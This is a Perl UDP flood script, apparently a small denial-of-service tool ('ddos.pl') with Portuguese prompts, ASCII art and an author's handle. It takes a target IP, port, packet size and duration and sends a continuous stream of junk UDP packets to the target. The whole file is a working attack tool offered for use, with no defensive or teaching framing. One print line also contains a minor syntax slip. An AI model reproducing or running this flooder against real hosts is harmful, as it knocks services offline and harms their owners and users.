#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

##
# Marcos Murphy the braboooo
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "IP INVALIDO | COMANDO: perl ddos.pl (IP) (PORTA) (THREADS) (TEMPO)$ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD CYAN<<EOTEXT;

  ▕╮╭┻┻╮╭┻┻╮╭▕╮╲
  ▕╯┃╭╮┃┃╭╮┃╰▕╯╭▏
  ▕╭┻┻┻┛┗┻┻┛ ▕ ╰▏
  ▕╰━━━┓┈┈┈╭╮▕╭╮▏
  ▕╭╮╰┳┳┳┳╯╰╯▕╰╯▏
  ▕╰╯┈┗┛┗┛┈╭╮▕╮┈▏
Made by Marcos Murphy#0001                              		   
EOTEXT
print BOLD CYAN "IP: $ip\nPORTA: " . ($port ? $port : "ALEATORIA") . "\nTHREADS: " . ($size ? "$size-MEGA-BYTES" : "ALEATORIO") . "\nTEMPO: " . ($time ? "$time-SEGUNDOS" | "");
print BOLD CYAN "\nPARA PARAR APERTE CONTROL-C" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}